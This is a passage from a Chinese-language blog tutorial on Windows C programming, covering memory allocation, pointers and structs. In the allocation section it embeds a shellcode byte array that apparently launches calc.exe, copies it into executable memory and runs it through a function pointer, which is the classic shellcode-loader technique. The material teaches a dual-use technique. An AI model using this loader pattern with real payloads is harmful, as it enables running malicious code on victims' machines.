class="comment">功能：为具有num_elems个长度为elem_size元素的数组分配内存</span></span><br><span class="line"><span class="comment">说明：如果分配成功则返回指向被分配内存的指针，否则返回空指针NULL。</span></span><br><span class="line"><span class="comment">当内存不再使用时，应使用free()函数将内存块释放。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">char</span>* buffer1 = <span class="built_in">calloc</span>(MAX_PATH, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">HeapAlloc</span></span><br><span class="line"><span class="comment">[in] hHeap</span></span><br><span class="line"><span class="comment">要从中分配内存的堆的句柄。 此句柄由 HeapCreate 或 GetProcessHeap 函数返回。</span></span><br><span class="line"><span class="comment">[in] dwFlags</span></span><br><span class="line"><span class="comment">堆分配选项。 指定这些值中的任何一个都将替代使用 HeapCreate 创建堆时指定的相应值。 此参数可使用以下一个或多个值。</span></span><br><span class="line"><span class="comment">HEAP_GENERATE_EXCEPTIONS</span></span><br><span class="line"><span class="comment">系统将引发异常以指示函数失败（例如内存不足情况），而不是返回 NULL。</span></span><br><span class="line"><span class="comment">若要确保为此函数的所有调用生成异常，请在调用 HeapCreate 时指定HEAP_GENERATE_EXCEPTIONS。 在这种情况下，无需在此函数调用中额外指定 HEAP_GENERATE_EXCEPTIONS 。</span></span><br><span class="line"><span class="comment">HEAP_NO_SERIALIZE</span></span><br><span class="line"><span class="comment">序列化访问将不用于此分配。</span></span><br><span class="line"><span class="comment">若要确保禁用对此函数的所有调用的序列化访问，请在调用 HeapCreate 中指定HEAP_NO_SERIALIZE。 在这种情况下，无需在此函数调用中额外指定 HEAP_NO_SERIALIZE 。访问进程的默认堆时，不应指定此值。 系统可能会在应用程序的进程中创建其他线程，例如同时访问进程的默认堆的 CTRL+C 处理程序。</span></span><br><span class="line"><span class="comment">HEAP_ZERO_MEMORY</span></span><br><span class="line"><span class="comment">分配的内存将初始化为零。 否则，内存不会初始化为零。</span></span><br><span class="line"><span class="comment">[in] dwBytes</span></span><br><span class="line"><span class="comment">要分配的字节数。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">char</span>* buffer2 = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_PATH);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">VirtualAlloc</span></span><br><span class="line"><span class="comment">LPVOID lpAddress</span></span><br><span class="line"><span class="comment">指定分配或保留的内存区域的首选基地址.如果此参数为NULL,则会选择适当的地址.如果指定了地址,系统将尝试在指定的基地址上分配内存.注意,此地址必须是页对齐的.</span></span><br><span class="line"><span class="comment">SIZE_T dwSize</span></span><br><span class="line"><span class="comment">指定要分配的内存区域大小,以字节为单位</span></span><br><span class="line"><span class="comment">DWORD flAllocationType</span></span><br><span class="line"><span class="comment">指定内存的分配类型</span></span><br><span class="line"><span class="comment">DWORD flProtect </span></span><br><span class="line"><span class="comment">flProtect: 指定内存保护属性.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">char</span>* buffer3 = VirtualAlloc(<span class="number">0</span>, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="comment">// 上面只是申请了内存,但是并没有东西,需要我们把东西拷贝进去</span></span><br><span class="line"><span class="type">char</span>* dstStr = <span class="string">&quot;你好&quot;</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(buffer, dstStr, <span class="keyword">sizeof</span>(dstStr));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc: %s\n&quot;</span>, buffer);</span><br><span class="line"><span class="built_in">memcpy</span>(buffer1, dstStr,<span class="keyword">sizeof</span>(dstStr));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;calloc: %s\n&quot;</span>, buffer1);</span><br><span class="line"><span class="built_in">memcpy</span>(buffer2, dstStr, <span class="keyword">sizeof</span>(dstStr));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;HeapAlloc: %s\n&quot;</span>, buffer2);</span><br><span class="line"><span class="built_in">memcpy</span>(buffer3, dstStr, <span class="keyword">sizeof</span>(dstStr));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;VirtualAlloc: %s\n&quot;</span>, buffer3);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ShellCode简单例子</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line"><span class="type">char</span>* buffer4 = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (buffer4 == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memcpy</span>(buffer4, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="comment">// 0xC0000005: 读取位置 0xFFFFFFFFFFFFFFFF 时发生访问冲突</span></span><br><span class="line"><span class="comment">// 有两种原因:1. 数组越界2. 内存没有执行权限</span></span><br><span class="line"><span class="comment">// 总结: calloc、malloc、HeapAlloc 申请的内存没有执行权限</span></span><br><span class="line"><span class="comment">// 除了malloc其他的内存申请函数都带内存清理</span></span><br><span class="line"><span class="comment">// 使用指针去运行</span></span><br><span class="line">((<span class="type">void</span>(*)())buffer4)();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放内存 calloc、malloc用free()</span></span><br><span class="line"><span class="built_in">free</span>(buffer);</span><br><span class="line"><span class="built_in">free</span>(buffer1);</span><br><span class="line">    </span><br><span class="line"><span class="comment">// VirtualAlloc不会去主动释放,一旦释放ShellCode也就掉线了.也就是带执行权限的一般不会释放.</span></span><br><span class="line">    <span class="comment">// VirtualFree 释放通过 VirtualAlloc 分配的内存</span></span><br><span class="line">VirtualFree(buffer3, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="comment">// HeapFree</span></span><br><span class="line">HeapFree(GetProcessHeap(),<span class="number">0</span>,buffer2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h2><p>既然内存都申请了,按照内存的原理,肯定会有地址.所以也就引出了C语言的核心:指针.</p>    <div class="tag-plugin video" style="aspect-ratio:1.7777777777777777;max-width:100%;">    <iframe src="https://player.bilibili.com/player.html?bvid=BV1Gi4y1w7yG&autoplay=false" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true">    </iframe>    </div>    <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* buffer = <span class="built_in">malloc</span>(MAX_PATH);</span><br><span class="line"><span class="type">char</span>* buffer1 = <span class="built_in">calloc</span>(MAX_PATH, <span class="number">1</span>);</span><br><span class="line"><span class="type">char</span>* buffer2 = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_PATH);</span><br><span class="line"><span class="type">char</span>* buffer3 = VirtualAlloc(<span class="number">0</span>, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc Address: %p\n&quot;</span>, &amp;buffer);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;calloc Address: %p\n&quot;</span>, &amp;buffer1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;HeapAlloc Address: %p\n&quot;</span>, &amp;buffer2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;VirtualAlloc Address: %p\n&quot;</span>, &amp;buffer3);</span><br><span class="line"><span class="comment">// 释放内存 </span></span><br><span class="line"><span class="built_in">free</span>(buffer);</span><br><span class="line"><span class="built_in">free</span>(buffer1);</span><br><span class="line"><span class="keyword">if</span> (buffer3 == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">VirtualFree(buffer3, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">HeapFree(GetProcessHeap(),<span class="number">0</span>,buffer2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------\n&quot;</span>);</span><br><span class="line"><span class="comment">// 通过上面的代码可知&amp;是用来取地址的.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 指针用来存储变量在内存中的地址,通过指针可以对内存进行灵活的操作</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 指针声明的格式</span></span><br><span class="line"><span class="comment">* 变量类型 *变量名;</span></span><br><span class="line"><span class="comment">* 变量类型* 变量名;</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="comment">// 初始化指针请赋予NULL</span></span><br><span class="line"><span class="type">int</span>* x = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> *b = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&amp;获取变量的地址又称取地址运算符</span></span><br><span class="line"><span class="comment">*获取某地址对应的值又称间接运算符/取消引用运算符</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> number = <span class="number">5</span>;</span><br><span class="line"><span class="type">int</span>* numberAddress = &amp;number;</span><br><span class="line"><span class="type">int</span> value = *numberAddress;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;number&#x27;s address= %p\n&quot;</span>, &amp;number);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;numberAddress&#x27;s address= %p\n&quot;</span>, numberAddress);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;number&#x27;s value= %d\n&quot;</span>, number);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;value&#x27;s value= %d\n&quot;</span>, value);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------\n&quot;</span>);</span><br><span class="line"><span class="comment">// 也可简写为</span></span><br><span class="line"><span class="type">int</span> value1 = *(&amp;number);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用*+指针可以访问与修改指针所指的变量值.</span></span><br><span class="line"><span class="type">int</span>* ptr = &amp;number;<span class="comment">// 将ptr指向number,赋值为number的地址</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;number&#x27;s address= %p\n&quot;</span>, &amp;number);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;number&#x27;s value= %d\n&quot;</span>, number);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ptr&#x27;s address= %p\n&quot;</span>, &amp;ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ptr&#x27;s value= %p\n&quot;</span>, ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ptr pointing value= %d\n&quot;</span>, *ptr);</span><br><span class="line">*ptr = <span class="number">100</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ptr modify value= %d\n&quot;</span>, *ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造指向指针的指针,也就是二级指针</span></span><br><span class="line"><span class="type">int</span>* ptr1 = &amp;number;</span><br><span class="line"><span class="type">int</span>** ptr2 = &amp;ptr1;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;number&#x27;s address= %p\n&quot;</span>, &amp;number);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;number&#x27;s value= %d\n\n&quot;</span>, number);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ptr1&#x27;s address= %p\n&quot;</span>, &amp;ptr1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ptr1&#x27;s value= %p\n\n&quot;</span>, ptr1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ptr1 pointing value (*ptr1): %d\n\n&quot;</span>, *ptr1);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ptr2&#x27;s address= %p\n&quot;</span>, &amp;ptr2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ptr2&#x27;s value= %p\n&quot;</span>, ptr2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ptr2 pointing value (*ptr2): %p\n&quot;</span>, *ptr2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ptr2 pointing number value : %d\n&quot;</span>, **ptr2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">结构体(struct)是一种用户定义的数据类型,它允许将不同类型的数据组合在一起.</span></span><br><span class="line"><span class="comment">以便更方便地管理和使用这些数据。结构体在处理复杂数据结构时非常有用，</span></span><br><span class="line"><span class="comment">例如记录、数据包、树节点等。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个结构体并使用 typedef 为其命名</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MyStruct</span> &#123;</span></span><br><span class="line"><span class="type">char</span>* ipStr;</span><br><span class="line"><span class="type">char</span>* hostName;</span><br><span class="line"><span class="type">char</span>* userName;</span><br><span class="line"><span class="type">char</span>* passWord;</span><br><span class="line">&#125; MyStruct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MyStructq</span> &#123;</span></span><br><span class="line"><span class="type">char</span> ipStr[MAX_PATH];</span><br><span class="line"><span class="type">char</span> hostName[MAX_PATH];</span><br><span class="line"><span class="type">char</span> userName[MAX_PATH];</span><br><span class="line"><span class="type">char</span> passWord[MAX_PATH];</span><br><span class="line">&#125; MyStructq;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个学生信息的结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">Student</span> &#123;</span></span><br><span class="line"><span class="type">int</span> studentID;      <span class="comment">// 学号</span></span><br><span class="line"><span class="type">char</span> name[<span class="number">50</span>];      <span class="comment">// 姓名</span></span><br><span class="line"><span class="type">wchar_t</span>* alias;</span><br><span class="line"><span class="type">int</span> age;            <span class="comment">// 年龄</span></span><br><span class="line"><span class="type">char</span> gender;        <span class="comment">// 性别 (&#x27;M&#x27; 或 &#x27;F&#x27;)</span></span><br><span class="line"><span class="type">float</span> grade;        <span class="comment">// 成绩</span></span><br><span class="line">&#125; Student;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// 对结构体进行简单的初始化</span></span><br><span class="line">MyStruct mac = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">// 错误示范: 1.没有空间. 2. 指针的指针</span></span><br><span class="line"><span class="comment">//strcpy_s(mac.ipStr, MAX_PATH, &quot;127.0.0.1&quot;);</span></span><br><span class="line"><span class="comment">// 分配内存</span></span><br><span class="line">mac.ipStr = (<span class="type">char</span>*)<span class="built_in">malloc</span>(MAX_PATH * <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">mac.hostName = (<span class="type">char</span>*)<span class="built_in">malloc</span>(MAX_PATH * <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">mac.userName = (<span class="type">char</span>*)<span class="built_in">malloc</span>(MAX_PATH * <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">mac.passWord = (<span class="type">char</span>*)<span class="built_in">malloc</span>(MAX_PATH * <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mac.ipStr == <span class="literal">NULL</span> || mac.hostName == <span class="literal">NULL</span> || mac.userName == <span class="literal">NULL</span> || mac.passWord == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="comment">// 内存分配失败，处理错误</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Memory allocation failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 使用 strcpy_s 复制字符串</span></span><br><span class="line">strcpy_s(mac.ipStr, MAX_PATH, <span class="string">&quot;10.0.0.1&quot;</span>);</span><br><span class="line">strcpy_s(mac.hostName, MAX_PATH, <span class="string">&quot;example.com&quot;</span>);</span><br><span class="line">strcpy_s(mac.userName, MAX_PATH, <span class="string">&quot;user&quot;</span>);</span><br><span class="line">strcpy_s(mac.passWord, MAX_PATH, <span class="string">&quot;password&quot;</span>);</span><br><span class="line"><span class="comment">// 输出字符串</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;IP Address: %s\n&quot;</span>, mac.ipStr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Host Name: %s\n&quot;</span>, mac.hostName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;User Name: %s\n&quot;</span>, mac.userName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;PassWord: %s\n&quot;</span>, mac.passWord);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------\n&quot;</span>);</span><br><span class="line"><span class="comment">// 静态内存申请的</span></span><br><span class="line">MyStructq mac1 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">strcpy_s(mac1.ipStr, MAX_PATH, <span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">strcpy_s(mac1.hostName, MAX_PATH, <span class="string">&quot;www.baidu.com&quot;</span>);</span><br><span class="line">strcpy_s(mac1.userName, MAX_PATH, <span class="string">&quot;baidu&quot;</span>);</span><br><span class="line">strcpy_s(mac1.passWord, MAX_PATH, <span class="string">&quot;123456&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;IP Address: %s\n&quot;</span>, mac1.ipStr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Host Name: %s\n&quot;</span>, mac1.hostName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;User Name: %s\n&quot;</span>, mac1.userName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;PassWord: %s\n&quot;</span>, mac1.passWord);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个结构体变量</span></span><br><span class="line">Student student;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化结构体成员</span></span><br><span class="line">student.studentID = <span class="number">12345</span>;</span><br><span class="line">strcpy_s(student.name, <span class="number">50</span>, <span class="string">&quot;Alice&quot;</span>);</span><br><span class="line">student.alias = (<span class="type">wchar_t</span>*)<span class="built_in">malloc</span>(MAX_PATH * <span class="keyword">sizeof</span>(<span class="type">wchar_t</span>));</span><br><span class="line"><span class="comment">// WHCAR只需把前面换成wcs即可</span></span><br><span class="line"><span class="keyword">if</span> (student.alias == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 wcscpy_s 复制宽字符字符串</span></span><br><span class="line">wcscpy_s(student.alias, MAX_PATH, <span class="string">L&quot;Luna&quot;</span>);</span><br><span class="line">student.age = <span class="number">20</span>;</span><br><span class="line">student.gender = <span class="string">&#x27;F&#x27;</span>;</span><br><span class="line">student.grade = <span class="number">89.5</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">字符指针（char）*：需要显式分配内存。</span></span><br><span class="line"><span class="comment">字符数组（char[]）：不需要显式分配内存，内存在声明时已经分配。</span></span><br><span class="line"><span class="comment">其他基本类型（int、float、double等）：不需要显式分配内存。</span></span><br><span class="line"><span class="comment">其他指针类型（如int、float*等）*：需要显式分配内存。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结构体成员的值</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Student ID: %d\n&quot;</span>, student.studentID);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name: %s\n&quot;</span>, student.name);</span><br><span class="line"><span class="comment">// 输出宽字符字符串</span></span><br><span class="line">wprintf(<span class="string">L&quot;Alias: %ls\n&quot;</span>, student.alias);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Age: %d\n&quot;</span>, student.age);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Gender: %c\n&quot;</span>, student.gender);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Grade: %.2f\n&quot;</span>, student.grade);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span 